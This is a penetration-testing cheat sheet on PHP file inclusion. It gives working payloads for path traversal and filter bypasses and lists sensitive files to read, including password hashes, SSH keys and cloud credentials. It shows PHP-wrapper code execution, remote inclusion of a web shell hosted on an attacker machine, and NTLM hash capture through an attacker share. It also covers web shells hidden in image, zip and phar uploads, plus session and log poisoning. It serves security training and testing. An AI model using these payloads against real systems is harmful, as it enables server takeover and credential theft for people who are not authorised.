# File Inclusion

Many web applications manage files and use server-side scripts to include them. When input parameters (cookies, GET or POST parameters) used in those scripts are insufficiently validated and sanitized, these web apps can be vulnerable to file inclusion.

LFI/RFI (Local/Remote File Inclusion) attacks allow attackers to read sensitive files, include local or remote content that could lead to RCE (Remote Code Execution) or to client-side attacks such as XSS (Cross-Site Scripting).

Directory traversal (a.k.a. path traversal, directory climbing, backtracking, the dot dot slash attack) attacks allow attackers to access sensitive files on the file system, outside the web server directory. File inclusion attacks can leverage a directory traversal vulnerability to include files with a relative path.

### File disclosure

#### Local File Inclusion (LFI)

Can tell us which user we are running as, which could lead to us accessing his files (ex id\_rsa)

`/proc/self/environ`

`/proc/self/cmdline`

```shellscript
# If our input is passed after a directory, we can use path traversal to get our file
include("./languages/" . $_GET['language']);
http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/passwd

# If our input is passed after a prefix, put a / to make the prefix a directory
include("lang_" . $_GET['language']);
http://<SERVER_IP>:<PORT>/index.php?language=/../../../etc/passwd
```

Interesting files to include

```shellscript
# Process information
/proc/self/environ            # Environment variables
/proc/self/cmdline            # Command line of current process
/proc/self/stat               # Process statistics
/proc/self/status             # Process status
/proc/self/fd/[0-9]*          # File descriptors
/proc/self/cwd                # Current working directory
/proc/self/exe                # Executed binary

# System information
/proc/version                 # Kernel version
/proc/cpuinfo                 # CPU information
/proc/meminfo                 # Memory information
/proc/devices                 # Device drivers
/proc/net/tcp                 # TCP connections
/proc/net/udp                 # UDP connections
/proc/net/arp                 # ARP table
/proc/net/fib_trie            # Routing table

# Linux configuration files
/etc/passwd                    # User accounts
/etc/shadow                    # Password hashes
/etc/group                     # User groups
/etc/hosts                     # DNS mappings
/etc/resolv.conf               # DNS configuration
/etc/ssh/sshd_config           # SSH configuration
/etc/mysql/my.cnf              # MySQL configuration
/etc/apache2/apache2.conf      # Apache config
/etc/nginx/nginx.conf          # Nginx config

# Application files
/var/www/html/config.php      # PHP config
/var/www/html/.env            # Environment variables
/var/www/html/wp-config.php   # WordPress config
/var/www/html/.git/config     # Git configuration
/home/user/.ssh/id_rsa        # SSH private key
/home/user/.bash_history      # Command history
/root/.aws/credentials        # AWS credentials
/root/.docker/config.json     # Docker credentials

# Windows files
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\boot.ini
C:\xampp\apache\conf\httpd.conf
C:\wamp\apache\conf\httpd.conf
C:\Program Files\FileZilla Server\FileZilla Server.xml
```

{% embed url="https://hackviser.com/tactics/pentesting/web/lfi-rfi" %}

#### Basic bypasses

```shellscript
# If our input is being sanitized and ../ are being deleted, double them
$language = str_replace('../', '', $_GET['language']);
http://<SERVER_IP>:<PORT>/index.php?language=....//....//....//....//etc/passwd

# If our input is being sanitized, we can try to URL encode or double encode it
http://<SERVER_IP>:<PORT>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64

# If the app checks a regex to confirm the file included is under a certain path
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
http://<SERVER_IP>:<PORT>/index.php?language=languages/../../../../etc/passwd

# If an extension is appended to the file and PHP versions before 5.3/5.4
# Strings had a max length of 4096 characters, any after will be ignored
# ./ would also be removed
# We need to start the path with a non existing directory for it to work
# Add some padding to obtain the desired length so the only thing cut is the extension
http://<SERVER_IP>:<PORT>/index.php?language=non_existing_directory/../../../etc/passwd/./././././ REPEATED ~2048 times]
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done

# Bypass extension appended with null byte => PHP versions before 5.5
# The null byte would terminate the string
/etc/passwd%00
```

#### Read source code

```sh
# Use the convert php filter to output the b64 of the source code
php://filter/read=convert.base64-encode/resource=config
http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config
echo '<b64>' | base64 -d 

# As the goal is to read php source code, the first step is fuzz for php files
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
```

### Remote code execution

#### PHP wrappers

**Data**

Used to include external data, including PHP code. It is only possible if the `allow_url_include` setting is enabled in the PHP config

```sh
# Path for the PHP config for Apache and Nginx, where X.Y is the installed PHP version
/etc/php/X.Y/apache2/php.ini
/etc/php/X.Y/fpm/php.ini

# Grab the config. If we don't know the PHP version, we can try the latest version and
# then earlier ones if needed
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

# Encode a PHP code to pass to the Data wrapper
echo '<?php system($_GET["cmd"]); ?>' | base64

# Use the wrapper to get code execution
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```

**Input**

Used to include external input and execute PHP code. The difference with the Data wrapper is that input uses POST request data. It is only possible if the `allow_url_include` setting is enabled in the PHP config, see above

```sh
# Execute code with Input wrapper
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```

**Expect**

Executes commands through URL streams. We don’t need to pass it a web shell, as it is designed to execute commands. It is an external wrapper, so it needs to be manually installed and enabled on the backend server ⇒ no need for `allow_url_include`

```sh
# Check if the wrapper is installed in the PHP config (see Data wrapper for versions)
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect

# Execute commands with expect
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```

#### Zip

See LFI and file upload section

**Phar**

See LFI and file upload section

#### Remote file inclusion

This allows two main benefits:

1. Enumerating local-only ports and web applications (i.e. SSRF)
2. Gaining remote code execution by including a malicious script that we host

```sh
# Verify RFI => try to include a url and see if we can get its content
# Firt, we should try to include a local URL => if the page is rendered : code exec
# It may not be ideal to include the vulnerable page itself (i.e. index.php), as this 
# may cause a recursive inclusion loop and cause a DoS to the back-end server.
http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php

# RCE with RFI => Create a malicious file in the langage of the web app
# It is a good idea to host the script on a common HTTP port like 80 or 443, as these 
# ports may be whitelisted in case the vulnerable web application has a firewall 
# preventing outgoing connections
echo '<?php system($_GET["cmd"]); ?>' > shell.php
sudo python3 -m http.server <LISTENING_PORT>
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id

# Or with FTP => useful in case http ports are blocked by a firewall or the http:// 
# string gets blocked by a WAF
sudo python -m pyftpdlib -p 21
http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id

# Or with SMB if the web app is hosted on a Windows server
# (we can tell from the server version in the HTTP response headers)
impacket-smbserver -smb2support share $(pwd)
http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```

We also see that we were able to specify port 80 and get the web application on that port. If the back-end server hosted any other local web applications (e.g. port 8080), then we may be able to access them through the RFI vulnerability by applying SSRF techniques on it

**Steal hashes from windows**

If a windows server is running and we are able to make a call to our attacker machine (RFI), we can leverage that attack to steal the hash from the service account running the web server

```shellscript
# Start responder 
sudo responder -I <INTERFACE> -w -d

# Make a call to our server and get the NTLMv2 hash with responder
http://unika.htb/index.php?page=//<ATTACKER_IP>/<SHARE>
```

#### LFI and file upload

**Image upload**

```sh
# Crafting malicious image containing a web shell
# We added the magic byte at the front in case the upload form checks the extension and
# content type
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif

# Go on the upload form and submit the image

# Now that it is uploaded, we need to include it through the LFI vuln
# We need to know the path to the uploaded file => inspect the source code of the image
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```

**Zip upload**

This wrapper is not enabled by default

```sh
# Create the shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php

# Find the path to the image and include the file
# Include it with the zip wrapper as (zip://shell.jpg), and then refer to any files 
# within it with #shell.php (URL encoded)
<img src="/profile_images/shell.jpg" class="profile-image" id="profile-image">
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

**Phar upload**

```sh
# Write a PHP code to a shell.php file
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();

# This script can be compiled into a phar file that when called would write a web shell
# to a shell.txt sub-file, which we can interact with
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg

# Find the path and include it
<img src="/profile_images/shell.jpg" class="profile-image" id="profile-image">
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

#### Log poisoning

**PHP session poisoning**

The first thing we need to do in a PHP Session Poisoning attack is to examine our `PHPSESSID` session file and see if it contains any data we can control and poison

They are stored in `session` files on the back-end, and saved in `/var/lib/php/sessions/` on Linux and in `C:\\Windows\\Temp\\` on Windows. The name of the file that contains our user's data matches the name of our `PHPSESSID` cookie with the `sess_` prefix. For example, if the `PHPSESSID` cookie is set to `el4ukv0kqbvoirg7nkp4dncpk3`, then its location on disk would be `/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3`

```sh
# Check if we have a PHPSESSID cookie to our session
Inspect => storage

# If we find a value, try to include the corresponding file
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd

# Look at the value of what was included and check if we have control over a parameter
# In the example we have control over the langage but not the preference
# If we have control over a parameter, change it to a random value, include the session 
# file again and check if the parameter changed

# Here we control the langage parameter, so we try to write a PHP code inside it 
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E

# Execute code
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id

# To execute another command, the session file has to be poisoned with the web shell 
# again, as it gets overwritten with /var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd 
# after our last inclusion. Ideally, we would use the poisoned web shell to write a 
# permanent web shell to the web directory, or send a reverse shell for easier interaction.
```

{% embed url="https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/php-session" %}

**Server log poisoning**

Both `Apache` and `Nginx` maintain various log files, such as `access.log` and `error.log`. The `access.log` file contains various information about all requests made to the server, including each request's `User-Agent` header. As we can control the `User-Agent` header in our requests, we can use it to poison the server logs as we did above

Once poisoned, we need to include the logs through the LFI vulnerability, and for that we need to have read-access over the logs. `Nginx` logs are readable by low privileged users by default (e.g. `www-data`), while the `Apache` logs are only readable by users with high privileges (e.g. `root`/`adm` groups). However, in older or misconfigured `Apache` servers, these logs may be readable by low-privileged users.

By default, `Apache` logs are located in `/var/log/apache2/` on Linux and in `C:\\xampp\\apache\\logs\\` on Windows, while `Nginx` logs are located in `/var/log/nginx/` on Linux and in `C:\\nginx\\log\\` on Windows. However, the logs may be in a different location in some cases, so we may use an [LFI Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) to fuzz for their locations, as will be discussed in the next section.

```shellscript
# Try to include the log file 
http://<SERVER_IP>:<PORT>/index.php?language=<PATH_TO_LOG>
```

Intercept the request with burp, and poison the user-agent with PHP code (web shell)

```php
# PHP web shell
<php system($_GET['cmd']); ?>
```

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FpvDkGeExL9lRiXyAe0nM%2Fimage.png?alt=media&#x26;token=4844d223-d1e0-4712-be81-1555f1c36822" alt=""><figcaption></figcaption></figure>

As the log should now contain PHP code, the LFI vulnerability should execute this code, and we should be able to gain remote code execution. We can specify a command to be executed with (`&cmd=id`):

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FdyGq1ZaWFDQkRHtSST0F%2Fimage.png?alt=media&#x26;token=eb38fa81-f45f-4e69-a8da-42be544346ae" alt=""><figcaption></figcaption></figure>

The following are some of the service logs we may be able to read:

* `/var/log/sshd.log`
* `/var/log/mail`
* `/var/log/vsftpd.log`

We should first attempt reading these logs through LFI, and if we do have access to them, we can try to poison them as we did above. For example, if the ssh or ftp services are exposed to us, and we can read their logs through LFI, then we can try logging into them and set the username to PHP code, and upon including their logs, the PHP code would execute. The same applies the mail services, as we can send an email containing PHP code, and upon its log inclusion, the PHP code would execute. We can generalize this technique to any logs that log a parameter we control and that we can read through the LFI vulnerability

{% hint style="warning" %}
Tip: The `User-Agent` header is also shown on process files under the Linux `/proc/` directory. So, we can try including the `/proc/self/environ` or `/proc/self/fd/N` files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files. This may become handy in case we did not have read access over the server logs, however, these files may only be readable by privileged users as well.
{% endhint %}

### Automation

```shellscript
# Fuzz for uncommon parameters
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287

# Fuzz LFI payloads with a wordlist
https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287

# Fuzz for the server webroot. Wordlist for Linux and Windows
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287

# Fuzz for configuration and log file. Wordlist for Linux and Windows
https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux
https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287

# If we get a hit on /etc/apache2/apache2.conf, we will be able to get the path for the 
# logs. If a global variable is used in the path, read /etc/apache2/envvars to find the 
# variable
```
